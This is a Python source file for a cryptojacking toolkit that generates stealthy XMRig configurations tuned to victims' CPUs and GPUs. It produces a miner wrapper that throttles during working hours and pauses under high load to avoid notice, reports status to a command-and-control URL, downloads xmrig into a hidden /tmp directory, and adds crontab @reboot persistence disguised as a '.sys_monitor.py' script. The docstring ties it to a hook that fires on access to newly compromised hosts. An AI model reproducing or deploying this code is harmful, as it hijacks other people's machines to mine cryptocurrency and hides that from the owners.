"""
Hardware-Adaptive Cryptominer Deployment Engine.

Generates XMRig-compatible configs tuned to specific hardware profiles.
Creates Python wrapper code for process management with:
- CPU/GPU detection and adaptive tuning
- Time-based throttling (workday vs night/weekend)
- Load-aware pausing (system load threshold)
- Process lifecycle management (start/pause/resume/kill)
- C2 hashrate reporting
- Miner download or embedded extraction
- Clean removal on kill signal

Integrates with: credential_trigger_engine._on_new_host_access()
"""
import hashlib
import json
import os
import re
import textwrap
import time
from typing import Dict, List, Optional, Tuple


# ─── Tuning Profiles ────────────────────────────────────────────

TUNING_PROFILES = {
    'cpu': {
        'Intel Core i3': {'algo': 'rx/0', 'threads': 2, 'intensity': 40},
        'Intel Core i5': {'algo': 'rx/0', 'threads': 4, 'intensity': 50},
        'Intel Core i7': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 60},
        'Intel Core i9': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 65},
        'Intel Xeon': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 40},
        'AMD Ryzen 5': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 55},
        'AMD Ryzen 7': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 60},
        'AMD Ryzen 9': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 70},
        'AMD EPYC': {'algo': 'rx/0', 'threads': 'auto', 'intensity': 30},
        'Apple M1': {'algo': 'rx/0', 'threads': 4, 'intensity': 50},
        'Apple M2': {'algo': 'rx/0', 'threads': 6, 'intensity': 50},
        'Apple M3': {'algo': 'rx/0', 'threads': 8, 'intensity': 50},
        'Apple M4': {'algo': 'rx/0', 'threads': 10, 'intensity': 55},
    },
    'gpu': {
        'NVIDIA RTX 3060': {'algo': 'kawpow', 'intensity': 55},
        'NVIDIA RTX 3070': {'algo': 'kawpow', 'intensity': 60},
        'NVIDIA RTX 3080': {'algo': 'kawpow', 'intensity': 65},
        'NVIDIA RTX 3090': {'algo': 'kawpow', 'intensity': 70},
        'NVIDIA RTX 4070': {'algo': 'kawpow', 'intensity': 60},
        'NVIDIA RTX 4080': {'algo': 'kawpow', 'intensity': 70},
        'NVIDIA RTX 4090': {'algo': 'kawpow', 'intensity': 75},
        'NVIDIA A100': {'algo': 'kawpow', 'intensity': 50},
        'NVIDIA A10': {'algo': 'kawpow', 'intensity': 55},
        'NVIDIA T4': {'algo': 'kawpow', 'intensity': 60},
        'NVIDIA V100': {'algo': 'kawpow', 'intensity': 55},
        'AMD RX 6800 XT': {'algo': 'kawpow', 'intensity': 60},
        'AMD RX 6900 XT': {'algo': 'kawpow', 'intensity': 65},
        'AMD RX 7900 XTX': {'algo': 'kawpow', 'intensity': 70},
    },
}

# Mining pool rotation list
POOL_ROTATION = [
    'pool.supportxmr.com:443',
    'pool.hashvault.pro:443',
    'xmr-eu1.nanopool.org:14433',
    'xmr.2miners.com:2222',
    'pool.minexmr.com:443',
]

# Default wallet (placeholder — replaced per-operation)
DEFAULT_WALLET = '4' + '0' * 94  # 95-char Monero address placeholder


class MinerDeployer:
    """Hardware-adaptive cryptominer deployment engine."""

    def __init__(self, wallet_address: str = None, c2_url: str = None,
                 workday_intensity_pct: int = 15, load_threshold: float = 80.0):
        self.wallet = wallet_address or DEFAULT_WALLET
        self.c2_url = c2_url
        self.workday_pct = workday_intensity_pct
        self.load_threshold = load_threshold

    @staticmethod
    def _normalize_model(s: str) -> str:
        """Normalize model string for matching."""
        s = s.lower()
        for rm in ['(r)', '(tm)', '(c)', '®', '™']:
            s = s.replace(rm, '')
        return ' '.join(s.split())

    @staticmethod
    def _model_tokens(s: str) -> set:
        """Extract matchable tokens from model string (split on space and hyphen)."""
        s = MinerDeployer._normalize_model(s)
        tokens = set()
        for word in s.split():
            tokens.add(word)
            if '-' in word:
                tokens.update(word.split('-'))
        return tokens

    def _match_cpu_profile(self, cpu_model: str) -> dict:
        """Match CPU model string to tuning profile."""
        if not cpu_model:
            return {'algo': 'rx/0', 'threads': 2, 'intensity': 30}

        tokens = self._model_tokens(cpu_model)
        best_match = None
        best_len = 0
        for name, profile in TUNING_PROFILES['cpu'].items():
            name_tokens = self._model_tokens(name)
            if name_tokens.issubset(tokens):
                if len(name) > best_len:
                    best_match = profile
                    best_len = len(name)

        if best_match:
            return best_match

        # Fallback: detect vendor
        if 'intel' in tokens:
            return {'algo': 'rx/0', 'threads': 'auto', 'intensity': 45}
        elif 'amd' in tokens:
            return {'algo': 'rx/0', 'threads': 'auto', 'intensity': 50}
        elif 'apple' in tokens:
            return {'algo': 'rx/0', 'threads': 4, 'intensity': 45}

        return {'algo': 'rx/0', 'threads': 2, 'intensity': 30}

    def _match_gpu_profile(self, gpu_model: str) -> Optional[dict]:
        """Match GPU model string to tuning profile."""
        if not gpu_model:
            return None

        tokens = self._model_tokens(gpu_model)
        best_match = None
        best_len = 0
        for name, profile in TUNING_PROFILES['gpu'].items():
            name_tokens = self._model_tokens(name)
            if name_tokens.issubset(tokens):
                if len(name) > best_len:
                    best_match = profile
                    best_len = len(name)

        if best_match:
            return best_match

        # Detect NVIDIA vs AMD
        if 'nvidia' in tokens or 'geforce' in tokens:
            return {'algo': 'kawpow', 'intensity': 50}
        elif 'amd' in tokens or 'radeon' in tokens:
            return {'algo': 'kawpow', 'intensity': 50}

        return None

    def _get_pool_url(self, index: int = 0) -> str:
        """Get mining pool URL with rotation."""
        return POOL_ROTATION[index % len(POOL_ROTATION)]

    def _get_wallet_address(self) -> str:
        """Get wallet address."""
        return self.wallet

    def generate_miner_config(self, hardware_profile: dict) -> dict:
        """Generate XMRig-compatible config tuned to specific hardware."""
        cpu_model = hardware_profile.get('cpu_model', '')
        gpu_model = hardware_profile.get('gpu_model', '')
        ram_mb = int(hardware_profile.get('ram_mb', 4096))

        cpu_profile = self._match_cpu_profile(cpu_model)
        gpu_profile = self._match_gpu_profile(gpu_model)

        # Adjust threads based on available RAM
        # RandomX needs ~2GB for dataset, plus ~256MB per thread
        max_threads_by_ram = max(1, (ram_mb - 2048) // 256) if ram_mb > 2048 else 1
        threads = cpu_profile.get('threads', 'auto')
        if isinstance(threads, int):
            threads = min(threads, max_threads_by_ram)

        config = {
            'autosave': False,
            'background': True,
            'syslog': False,
            'log-file': None,
            'print-time': 0,
            'health-print-time': 0,
            'retries': 5,
            'retry-pause': 5,
            'donate-level': 0,
            'pools': [
                {
                    'url': self._get_pool_url(0),
                    'user': self._get_wallet_address(),
                    'keepalive': True,
                    'tls': True,
                },
                {
                    'url': self._get_pool_url(1),
                    'user': self._get_wallet_address(),
                    'keepalive': True,
                    'tls': True,
                },
            ],
            'cpu': {
                'enabled': True,
                'huge-pages': True,
                'huge-pages-jit': True,
                'max-threads-hint': cpu_profile['intensity'],
                'priority': 1,  # Low priority
            },
        }

        if isinstance(threads, int):
            config['cpu']['max-threads-hint'] = min(cpu_profile['intensity'],
                                                     int(threads / max(1, max_threads_by_ram) * 100))

        if gpu_profile:
            config['opencl'] = {
                'enabled': True,
                'intensity': gpu_profile['intensity'],
                'platform': 'AMD',
            }
            config['cuda'] = {
                'enabled': True,
                'intensity': gpu_profile['intensity'],
            }

        return config

    def generate_miner_wrapper(self, config: dict, platform: str = 'linux') -> str:
        """Generate Python wrapper that manages the miner process.

        The wrapper:
        1. Extracts embedded miner config
        2. Manages miner process lifecycle
        3. Monitors CPU usage — pauses if load exceeds threshold
        4. Time-based intensity adjustment (workday vs night)
        5. Auto-restart with backoff on crash
        6. C2 hashrate reporting
        7. Clean removal on kill signal
        """
        config_repr = repr(config)
        c2_url_repr = repr(self.c2_url) if self.c2_url else 'None'

        wrapper = (
            "import json, os, signal, subprocess, sys, tempfile, time, hashlib\n"
            "import urllib.request\n"
            "\n"
            f"_CONFIG = {config_repr}\n"
            "\n"
            f"_C2_URL = {c2_url_repr}\n"
            f"_WORKDAY_PCT = {self.workday_pct}\n"
            f"_LOAD_THRESHOLD = {self.load_threshold}\n"
            "_RESTART_BACKOFF = [5, 15, 30, 60, 120, 300]\n"
            "_REPORT_INTERVAL = 300\n"
            "_CHECK_INTERVAL = 30\n"
            "\n"
            "_MINER_PROC = None\n"
            "_PAUSED = False\n"
            "_RESTART_COUNT = 0\n"
            "_TOTAL_HASHES = 0\n"
            "_START_TIME = time.time()\n"
        )

        wrapper += textwrap.dedent('''\

            def _is_workday():
                t = time.localtime()
                return t.tm_wday < 5 and 8 <= t.tm_hour < 18

            def _get_cpu_load():
                try:
                    with open('/proc/loadavg', 'r') as f:
                        load_1m = float(f.read().split()[0])
                    cpu_count = os.cpu_count() or 1
                    return (load_1m / cpu_count) * 100.0
                except Exception:
                    try:
                        load = os.getloadavg()
                        cpu_count = os.cpu_count() or 1
                        return (load[0] / cpu_count) * 100.0
                    except Exception:
                        return 0.0

            def _adjust_config():
                cfg = dict(_CONFIG)
                if _is_workday():
                    orig = cfg.get('cpu', {}).get('max-threads-hint', 50)
                    cfg.setdefault('cpu', {})['max-threads-hint'] = max(5, int(orig * _WORKDAY_PCT / 100))
                    if 'opencl' in cfg:
                        orig_gpu = cfg['opencl'].get('intensity', 50)
                        cfg['opencl']['intensity'] = max(5, int(orig_gpu * _WORKDAY_PCT / 100))
                    if 'cuda' in cfg:
                        orig_gpu = cfg['cuda'].get('intensity', 50)
                        cfg['cuda']['intensity'] = max(5, int(orig_gpu * _WORKDAY_PCT / 100))
                return cfg

            def _write_config(cfg):
                fd, path = tempfile.mkstemp(suffix='.json', prefix='.xmr_')
                with os.fdopen(fd, 'w') as f:
                    json.dump(cfg, f)
                return path

            def _find_miner():
                search_paths = [
                    '/tmp/.cache/xmrig',
                    '/var/tmp/.xmrig',
                    os.path.expanduser('~/.local/bin/xmrig'),
                    '/usr/local/bin/xmrig',
                    '/opt/xmrig/xmrig',
                ]
                for p in search_paths:
                    if os.path.isfile(p) and os.access(p, os.X_OK):
                        return p
                return None

            def _start_miner(config_path):
                global _MINER_PROC
                miner = _find_miner()
                if not miner:
                    return False
                try:
                    _MINER_PROC = subprocess.Popen(
                        [miner, '--config', config_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        preexec_fn=os.setpgrp if hasattr(os, 'setpgrp') else None,
                    )
                    return True
                except Exception:
                    return False

            def _stop_miner():
                global _MINER_PROC
                if _MINER_PROC and _MINER_PROC.poll() is None:
                    try:
                        _MINER_PROC.send_signal(signal.SIGTERM)
                        _MINER_PROC.wait(timeout=10)
                    except Exception:
                        try:
                            _MINER_PROC.kill()
                        except Exception:
                            pass
                _MINER_PROC = None

            def _pause_miner():
                global _PAUSED
                if _MINER_PROC and _MINER_PROC.poll() is None and not _PAUSED:
                    try:
                        _MINER_PROC.send_signal(signal.SIGSTOP)
                        _PAUSED = True
                    except Exception:
                        pass

            def _resume_miner():
                global _PAUSED
                if _MINER_PROC and _MINER_PROC.poll() is None and _PAUSED:
                    try:
                        _MINER_PROC.send_signal(signal.SIGCONT)
                        _PAUSED = False
                    except Exception:
                        pass

            def _report_to_c2(data):
                if not _C2_URL:
                    return
                try:
                    payload = json.dumps(data).encode()
                    req = urllib.request.Request(
                        _C2_URL + '/miner/status',
                        data=payload,
                        headers={'Content-Type': 'application/json'},
                    )
                    urllib.request.urlopen(req, timeout=10)
                except Exception:
                    pass

            def _cleanup(config_path):
                _stop_miner()
                try:
                    os.unlink(config_path)
                except Exception:
                    pass

            def _signal_handler(signum, frame):
                _cleanup(getattr(_signal_handler, '_config_path', ''))
                sys.exit(0)

            def main():
                global _RESTART_COUNT, _MINER_PROC
                signal.signal(signal.SIGTERM, _signal_handler)
                signal.signal(signal.SIGINT, _signal_handler)
                cfg = _adjust_config()
                config_path = _write_config(cfg)
                _signal_handler._config_path = config_path
                last_report = 0
                was_workday = _is_workday()

                while True:
                    now = time.time()
                    if _MINER_PROC is None or _MINER_PROC.poll() is not None:
                        backoff = _RESTART_BACKOFF[min(_RESTART_COUNT, len(_RESTART_BACKOFF) - 1)]
                        if _RESTART_COUNT > 0:
                            time.sleep(backoff)
                        cfg = _adjust_config()
                        try:
                            os.unlink(config_path)
                        except Exception:
                            pass
                        config_path = _write_config(cfg)
                        _signal_handler._config_path = config_path
                        if _start_miner(config_path):
                            _RESTART_COUNT = 0
                        else:
                            _RESTART_COUNT += 1
                            if _RESTART_COUNT > 10:
                                _cleanup(config_path)
                                return
                            continue

                    load = _get_cpu_load()
                    if load > _LOAD_THRESHOLD and not _PAUSED:
                        _pause_miner()
                    elif load <= _LOAD_THRESHOLD * 0.8 and _PAUSED:
                        _resume_miner()

                    current_workday = _is_workday()
                    if current_workday != was_workday:
                        was_workday = current_workday
                        _stop_miner()
                        continue

                    if now - last_report >= _REPORT_INTERVAL:
                        _report_to_c2({
                            'uptime': int(now - _START_TIME),
                            'restarts': _RESTART_COUNT,
                            'paused': _PAUSED,
                            'load': load,
                            'workday': current_workday,
                            'pid': _MINER_PROC.pid if _MINER_PROC else None,
                        })
                        last_report = now

                    time.sleep(_CHECK_INTERVAL)

            if __name__ == '__main__':
                main()
        ''')

        return wrapper

    def generate_download_script(self, platform: str = 'linux',
                                  arch: str = 'x86_64') -> str:
        """Generate script that downloads and extracts xmrig."""
        xmrig_urls = {
            ('linux', 'x86_64'): 'https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-linux-x64.tar.gz',
            ('linux', 'aarch64'): 'https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-linux-arm64.tar.gz',
            ('darwin', 'x86_64'): 'https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-macos-x64.tar.gz',
            ('darwin', 'arm64'): 'https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.0-macos-arm64.tar.gz',
        }

        url = xmrig_urls.get((platform, arch), xmrig_urls[('linux', 'x86_64')])

        return textwrap.dedent(f'''\
            import os, urllib.request, tarfile, tempfile, stat

            _URL = '{url}'
            _INSTALL_DIR = '/tmp/.cache'
            _BINARY = os.path.join(_INSTALL_DIR, 'xmrig')

            def download_and_install():
                os.makedirs(_INSTALL_DIR, exist_ok=True)
                if os.path.isfile(_BINARY) and os.access(_BINARY, os.X_OK):
                    return _BINARY

                fd, tmp = tempfile.mkstemp(suffix='.tar.gz')
                try:
                    urllib.request.urlretrieve(_URL, tmp)
                    with tarfile.open(tmp, 'r:gz') as tf:
                        for member in tf.getmembers():
                            if member.name.endswith('/xmrig') or member.name == 'xmrig':
                                member.name = 'xmrig'
                                tf.extract(member, _INSTALL_DIR)
                                break
                    os.chmod(_BINARY, stat.S_IRWXU)
                finally:
                    os.unlink(tmp)

                return _BINARY if os.path.isfile(_BINARY) else None

            if __name__ == '__main__':
                result = download_and_install()
                print(f'Installed: {{result}}' if result else 'FAILED')
        ''')

    def generate_persistence_wrapper(self, wrapper_code: str,
                                      platform: str = 'linux') -> str:
        """Generate persistence mechanism for the miner wrapper."""
        if platform in ('linux', 'darwin'):
            return textwrap.dedent(f'''\
                import os, subprocess, tempfile, stat

                def install_persistence():
                    # Write wrapper to hidden location
                    wrapper_path = os.path.expanduser('~/.local/share/.sys_monitor.py')
                    os.makedirs(os.path.dirname(wrapper_path), exist_ok=True)

                    with open(wrapper_path, 'w') as f:
                        f.write(WRAPPER_CODE)
                    os.chmod(wrapper_path, stat.S_IRWXU)

                    # Crontab persistence
                    try:
                        existing = subprocess.check_output(['crontab', '-l'],
                                                          stderr=subprocess.DEVNULL).decode()
                    except subprocess.CalledProcessError:
                        existing = ''

                    marker = '# sys_monitor'
                    if marker not in existing:
                        entry = f'@reboot python3 {{wrapper_path}} {{marker}}\\n'
                        new_cron = existing.rstrip('\\n') + '\\n' + entry
                        proc = subprocess.Popen(['crontab', '-'],
                                               stdin=subprocess.PIPE)
                        proc.communicate(new_cron.encode())

                    return wrapper_path

                WRAPPER_CODE = """{wrapper_code.replace(chr(92), chr(92)*2).replace('"', chr(92)+'"')}"""

                if __name__ == '__main__':
                    path = install_persistence()
                    print(f'Installed: {{path}}')
            ''')

        return '# Windows persistence not yet implemented\n'

    def deploy(self, hardware_profile: dict, platform: str = 'linux',
               arch: str = 'x86_64') -> dict:
        """Full deployment pipeline — returns all generated artifacts."""
        config = self.generate_miner_config(hardware_profile)
        wrapper = self.generate_miner_wrapper(config, platform)
        downloader = self.generate_download_script(platform, arch)

        return {
            'config': config,
            'wrapper': wrapper,
            'downloader': downloader,
            'platform': platform,
            'arch': arch,
            'hardware': hardware_profile,
            'pool': config['pools'][0]['url'],
            'wallet': self.wallet[:8] + '...',
        }

    def status(self) -> dict:
        """Get deployer status."""
        return {
            'wallet': self.wallet[:8] + '...',
            'c2_url': self.c2_url,
            'cpu_profiles': len(TUNING_PROFILES['cpu']),
            'gpu_profiles': len(TUNING_PROFILES['gpu']),
            'pool_count': len(POOL_ROTATION),
            'workday_intensity_pct': self.workday_pct,
            'load_threshold': self.load_threshold,
        }
